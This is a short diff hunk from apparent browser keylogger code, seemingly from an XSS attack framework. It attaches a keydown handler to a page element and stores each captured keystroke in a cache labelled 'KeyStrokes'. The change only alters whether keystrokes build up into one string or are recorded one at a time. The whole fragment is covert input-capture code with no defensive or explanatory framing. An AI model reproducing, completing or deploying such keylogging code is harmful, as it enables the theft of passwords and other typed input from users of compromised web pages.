@@ -28,7 +28,7 @@ $(tagName[0]).keydown(function(event){
 	               "', keyCode:'"+event.keyCode+
 	               "'}";  
 	
-	keystrokes = keystrokes + String.fromCharCode(event.keyCode);  
+	keystrokes = String.fromCharCode(event.keyCode);  
 	anehtaCache.appendItem("KeyStrokes", keystrokes);                        
 	//alert(keystrokes);
 	i=i+1;
